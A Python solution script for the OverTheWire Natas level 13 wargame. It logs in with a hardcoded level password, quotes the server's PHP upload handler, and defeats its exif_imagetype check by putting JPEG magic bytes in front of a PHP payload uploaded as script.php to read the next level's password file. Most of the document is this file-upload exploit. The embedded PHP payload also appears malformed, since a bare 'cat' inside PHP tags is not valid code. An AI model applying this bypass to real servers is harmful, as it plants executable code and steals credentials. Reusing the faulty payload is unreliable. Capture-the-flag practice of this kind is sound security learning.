import requests
import re
import bs4


# configuration for natas13
USERNAME = 'natas13'
PASSWORD = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)
URL = 'http://natas13.natas.labs.overthewire.org/'


session = requests.Session()
session.auth = AUTH
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source code
response = session.get(URL + 'index-source.html')
# print(response.text)
"""
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else { 
"""
# exif_imagetype() reads the first bytes of an image and checks its signature. 
# reference: https://www.php.net/manual/en/function.exif-imagetype.php
# therefore, we can simply add the magic bytes to our php script and the server will see it as an image
# reference: https://en.wikipedia.org/wiki/List_of_file_signatures
# the magic bytes for jpeg is (in hex) FF D8 FF DB
php_script = """
<?
cat /etc/natas_webpass/natas14
?>
"""
jpg_magic_bytes = "ffd8ffdb"


files = {
    "uploadedfile" : bytearray.fromhex(jpg_magic_bytes) + bytearray(php_script, 'utf-8')
}
data = {
    "filename" : "script.php",
    "submit" : 'submit'
}
response = session.post(URL + 'index.php', data=data, files=files)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


